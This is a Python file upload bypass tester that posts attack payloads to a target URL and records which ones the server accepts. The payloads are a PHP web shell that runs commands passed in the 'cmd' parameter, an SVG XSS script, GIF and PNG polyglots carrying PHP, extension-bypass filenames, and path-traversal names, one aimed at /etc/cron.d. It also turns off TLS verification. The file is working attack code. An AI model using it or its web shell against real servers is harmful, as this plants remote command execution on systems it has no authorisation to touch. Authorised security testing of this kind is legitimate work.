#!/usr/bin/env python3
"""
file_upload.py — File Upload Bypass Testing

Tests for:
1. Extension bypass (double ext, null byte, case)
2. Content-Type manipulation
3. Polyglot files (image+PHP, SVG+XSS)
4. Path traversal in filename (../../shell.php)
5. Size limit bypass

Usage:
    from file_upload import FileUploadTester
    tester = FileUploadTester()
    result = tester.test_upload("https://target.com/upload", "file")
"""
import json, os, time
from pathlib import Path

try:
    import requests
except ImportError:
    requests = None

EXTENSION_BYPASSES = [
    ("shell.php", "application/x-php"),
    ("shell.php5", "application/x-php"),
    ("shell.phtml", "application/x-php"),
    ("shell.pHp", "application/x-php"),
    ("shell.php.jpg", "image/jpeg"),
    ("shell.jpg.php", "application/x-php"),
    ("shell.php%00.jpg", "image/jpeg"),
    ("shell.php\x00.jpg", "image/jpeg"),
    ("shell.PhP", "application/x-php"),
    ("shell.php.", "application/x-php"),
    ("shell.php;.jpg", "image/jpeg"),
    ("shell.php::$DATA", "application/x-php"),
    ("shell.asp", "application/x-asp"),
    ("shell.aspx", "application/x-aspx"),
    ("shell.jsp", "application/x-jsp"),
    ("shell.jspx", "application/x-jsp"),
    ("shell.svg", "image/svg+xml"),
    ("shell.html", "text/html"),
    ("shell.shtml", "text/html"),
    (".htaccess", "text/plain"),
    ("shell.py", "text/x-python"),
]

CONTENT_TYPE_BYPASSES = [
    "image/jpeg", "image/png", "image/gif",
    "application/octet-stream", "text/plain",
    "image/svg+xml", "application/pdf",
]

PHP_WEBSHELL = '<?php echo "XXE_UPLOAD_TEST"; system($_GET["cmd"]); ?>'
SVG_XSS = '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>'
GIF_PHP = b'GIF89a<?php echo "XXE_UPLOAD_TEST"; ?>'
PNG_PHP = b'\x89PNG\r\n\x1a\n<?php echo "XXE_UPLOAD_TEST"; ?>'


class FileUploadTester:
    def __init__(self):
        self.findings = []
        self.session = requests.Session() if requests else None
        if self.session:
            self.session.verify = False
            import urllib3; urllib3.disable_warnings()

    def test_upload(self, url: str, field: str = "file",
                    headers: dict = None) -> dict:
        headers = headers or {}
        result = {"url": url, "vulnerable": False, "findings": []}

        # Test 1: Extension bypasses
        for filename, ct in EXTENSION_BYPASSES:
            content = PHP_WEBSHELL.encode() if "php" in filename.lower() else SVG_XSS.encode()
            try:
                resp = self.session.post(
                    url, files={field: (filename, content, ct)},
                    headers=headers, timeout=10)

                if resp.status_code in (200, 201):
                    finding = {
                        "filename": filename, "content_type": ct,
                        "status": resp.status_code, "accepted": True,
                    }
                    # Check if we got a URL back
                    try:
                        body = resp.json()
                        for key in ("url", "path", "file", "filename", "location"):
                            if key in body:
                                finding["uploaded_url"] = str(body[key])[:200]
                                break
                    except Exception:
                        pass

                    # Check for dangerous extensions accepted
                    if any(ext in filename.lower() for ext in
                           (".php", ".asp", ".jsp", ".py", ".htaccess")):
                        finding["severity"] = "CRITICAL"
                        result["vulnerable"] = True
                        self.findings.append({"type": "FILE_UPLOAD", "url": url, **finding})

                    result["findings"].append(finding)
            except Exception:
                continue
            time.sleep(0.3)

        # Test 2: Content-Type bypass (send PHP with image content-type)
        for ct in CONTENT_TYPE_BYPASSES:
            try:
                resp = self.session.post(
                    url, files={field: ("test.php", PHP_WEBSHELL.encode(), ct)},
                    headers=headers, timeout=10)
                if resp.status_code in (200, 201):
                    result["findings"].append({
                        "type": "CONTENT_TYPE_BYPASS",
                        "content_type_sent": ct, "accepted": True})
            except Exception:
                continue

        # Test 3: Polyglot (GIF header + PHP)
        for name, content in [("poly.php.gif", GIF_PHP), ("poly.php.png", PNG_PHP)]:
            try:
                resp = self.session.post(
                    url, files={field: (name, content, "image/gif")},
                    headers=headers, timeout=10)
                if resp.status_code in (200, 201):
                    result["findings"].append({
                        "type": "POLYGLOT", "filename": name, "accepted": True})
            except Exception:
                continue

        # Test 4: Path traversal in filename
        traversal_names = [
            "../../shell.php", "../../../etc/cron.d/shell",
            "..\\..\\shell.php", "....//....//shell.php",
        ]
        for name in traversal_names:
            try:
                resp = self.session.post(
                    url, files={field: (name, PHP_WEBSHELL.encode(), "image/jpeg")},
                    headers=headers, timeout=10)
                if resp.status_code in (200, 201):
                    result["findings"].append({
                        "type": "PATH_TRAVERSAL_UPLOAD",
                        "filename": name, "severity": "CRITICAL", "accepted": True})
                    result["vulnerable"] = True
                    self.findings.append({"type": "UPLOAD_PATH_TRAVERSAL",
                                         "url": url, "filename": name, "severity": "CRITICAL"})
            except Exception:
                continue

        return result

    def save_findings(self, target: str) -> None:
        out = Path(f"findings/{target}/file_upload")
        out.mkdir(parents=True, exist_ok=True)
        if self.findings:
            (out / f"upload_{int(time.time())}.json").write_text(
                json.dumps(self.findings, indent=2, default=str))
